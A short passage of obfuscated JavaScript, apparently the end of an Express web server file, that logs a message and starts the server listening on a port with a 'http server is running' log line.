_0x40527c=_0xdfff8c;console[_0x40527c(0x211)](_0x40527c(0x1e1),_0x277aca);}),app[_0xdfff8c(0x1e0)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
